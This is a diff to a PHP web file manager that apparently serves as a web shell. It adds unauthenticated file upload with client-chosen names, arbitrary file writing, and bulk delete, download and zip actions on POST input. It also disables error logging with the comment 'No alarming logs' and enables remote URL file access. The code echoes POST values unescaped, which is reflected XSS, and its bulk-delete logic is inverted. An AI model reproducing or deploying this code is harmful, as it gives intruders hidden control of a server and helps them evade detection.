@@ -121,7 +121,7 @@ function cwd() {
 function alert($type, $msg) {
 	?>
 	<tr>
-		<td>
+		<td colspan="6">
 			<div class="alert <?=$type?>">
 				<span class="<?=$type?>">
 					<?= $msg ?>
@@ -242,6 +242,16 @@ class Files {
 				}
 			}
 		} return;
+	}
+
+	function write($filename, $text, $type = 'file') {
+		if ($type) {
+			$handle = fopen($filename, "w");
+			fwrite($handle, $text);
+			fclose($handle);
+		} else {
+			return mkdir($filename);
+		}
 	}
 
 	function edit($path, $text)  {
@@ -477,7 +487,14 @@ switch (@$_POST['action']) {
 		exit();
 		break;
 	case 'delete':
-		$file->delete($_POST['file']);
+		if ($file->delete($_POST['file'])) {
+			if (isset($_POST['dirs'])) {
+				chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
+			}
+		}
+		?>
+		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
+		<?php
 		break;
 	case 'back':
 		if (isset($_POST['dirs'])) {
@@ -486,6 +503,30 @@ switch (@$_POST['action']) {
 		?>
 		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
 		<?php
+		break;
+	case 'upload':
+		?>
+		<tr>
+			<td colspan="5">
+				<form method="post" enctype="multipart/form-data">
+					<input type="file" name="file[]" multiple>
+				</td>
+			<td>
+					<input type="submit" name="submit" value="UPLOAD">
+				</form>
+			</td>
+		</tr>
+		<?php
+		if (isset($_POST['submit'])) {
+			$file = count($_FILES['file']['tmp_name']);
+			for ($i=0; $i < $file ; $i++) { 
+				if (copy($_FILES['file']['tmp_name'][$i], $_FILES['file']['name'][$i])) {
+					alert("success", "uploaded <u>{$_FILES['file']['name'][$i]}</u>");
+				} else {
+					alert("failed");
+				}
+			}
+		}
 		break;
 }
 ?>
@@ -496,6 +537,15 @@ switch (@$_POST['action']) {
 		</th>
 	</form>
 </tr>
+<tr>
+	<form method="post">
+		<td colspan="6">
+			<center>
+				<button name="action" value="upload">UPLOAD</button>
+			</center>
+		</td>
+	</form>
+</tr>
 <?php
 $iterator = new DirectoryIterator(cwd());
 foreach ($iterator as $dir) {
@@ -503,7 +553,7 @@ foreach ($iterator as $dir) {
 		?>
 		<tr>
 			<td>
-				<input type="checkbox" name="data[]" value="<?= $dir->getPathname() ?>">
+				<input type="checkbox" form="my_form" name="data[]" value="<?= $dir->getPathname() ?>">
 			</td>
 			<td class="icon">
 				<img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
@@ -545,13 +595,13 @@ foreach ($iterator as $files) {
 		?>
 		<tr>
 			<td style="width:1%;">
-				<input type="checkbox" name="data[]" value="<?= $files->getPathname() ?>">
+				<input type="checkbox" form="my_form" name="data[]" value="<?= $files->getPathname() ?>">
 			</td>
 			<td class="icon">
 				<?= $file->img($files->getPathname()) ?>
 			</td>
 			<td>
-				<a href="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).DIRECTORY_SEPARATOR.basename($files->getPathname())?>" target='_blank'>
+				<a href="http://<?=str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['HTTP_HOST'], cwd()).DIRECTORY_SEPARATOR.basename($files->getPathname())?>" target='_blank'>
 					<button><?=basename($files->getPathname())?></button>
 				</a>
 			</td>
@@ -608,4 +658,71 @@ foreach ($iterator as $files) {
 	}
 }
 ?>
+<tr>
+	<form method="post" id="my_form">
+	<td class="no-border">
+		<input type="checkbox" onclick="checkAll(this)">
+	</td>
+	<td class="no-border">All</td>
+	<td class="no-border" colspan="3">
+		<select name="mode" style="width:100%;" onchange='if(this.value != 0) { this.form.submit(); }'>
+			<option selected>CHOOSE . . </option>
+			<option value="1">DELETE</option>
+			<option value="backup">BACKUP</option>
+			<option value="download">DOWNLOAD</option>
+			<option value="zip">COMPRESS TO ZIP</option>
+		</select>
+	</td>
+	</form>
+</tr>
+<?php
+if (!empty($data = @$_POST['data'])) {
+	foreach ($data as $filename) {
+		switch ($_POST['mode']) {
+			case '1':
+				if ($file->delete($filename)) {
+					alert("failed", "failed");
+				} else {
+					if (isset($_POST['dirs'])) {
+						chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
+					}
+					?>
+					<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
+					<?php
+				}
+			break;
+		}
+	}
+}
+?>
+<script type="text/javascript">
+	function checkAll(ele) {
+		var checkboxes = document.getElementsByTagName('input');
+		if (ele.checked) {
+			for (var i = 0; i < checkboxes.length; i++) {
+				if (checkboxes[i].type == 'checkbox' ) {
+					checkboxes[i].checked = true;
+				}
+           	}
+       	} else {
+           	for (var i = 0; i < checkboxes.length; i++) {
+               	if (checkboxes[i].type == 'checkbox') {
+                   	checkboxes[i].checked = false;
+               	}
+           	}
+       	}
+   	}
+</script>
 </table>
+<?php
+if(function_exists('ini_set')) {
+    ini_set('error_log',NULL);  // No alarming logs
+    ini_set('log_errors',0);    // No logging of errors
+    ini_set('file_uploads',1);  // Enable file uploads
+    ini_set('allow_url_fopen',1);   // allow url fopen 
+}else{
+    ini_alter('error_log',NULL);
+    ini_alter('log_errors',0);
+    ini_alter('file_uploads',1);
+    ini_alter('allow_url_fopen',1);
+}
